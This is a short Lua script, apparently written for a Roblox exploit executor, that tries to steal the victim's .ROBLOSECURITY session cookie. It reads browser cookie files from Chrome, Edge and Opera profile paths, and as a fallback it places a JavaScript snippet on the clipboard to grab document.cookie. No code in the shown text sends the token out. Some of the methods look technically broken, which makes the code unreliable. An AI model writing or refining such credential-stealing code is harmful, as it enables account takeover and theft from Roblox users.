-- Grab cookie from browser storage instead
local robloToken = "COOKIE_NOT_FOUND"

-- Method: Read from browser's cookie storage directly
if isfolder and isfile and readfile then
    local paths = {
        "C:/Users/" .. game.Players.LocalPlayer.Name .. "/AppData/Local/Google/Chrome/User Data/Default/Cookies",
        "C:/Users/" .. game.Players.LocalPlayer.Name .. "/AppData/Local/Microsoft/Edge/User Data/Default/Cookies",
        "C:/Users/" .. game.Players.LocalPlayer.Name .. "/AppData/Roaming/Opera Software/Opera Stable/Cookies"
    }
    
    for _, path in pairs(paths) do
        pcall(function()
            if isfile(path) then
                local cookieData = readfile(path)
                local match = cookieData:match("%.ROBLOSECURITY[^}]+value=([^&]+)")
                if match then
                    robloToken = match
                end
            end
        end)
        if robloToken ~= "COOKIE_NOT_FOUND" then break end
    end
end

-- If still not found, try the executor's clipboard hook method
if robloToken == "COOKIE_NOT_FOUND" and setclipboard and getclipboard then
    pcall(function()
        local old = getclipboard()
        -- Inject JS to copy cookie to clipboard
        local js = [[
            javascript:(function(){
                var cookie = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
                if(cookie) navigator.clipboard.writeText(cookie[1]);
            })()
        ]]
        setclipboard(js)
        wait(1)
        robloToken = getclipboard()
        setclipboard(old) -- restore old clipboard
    end)
end

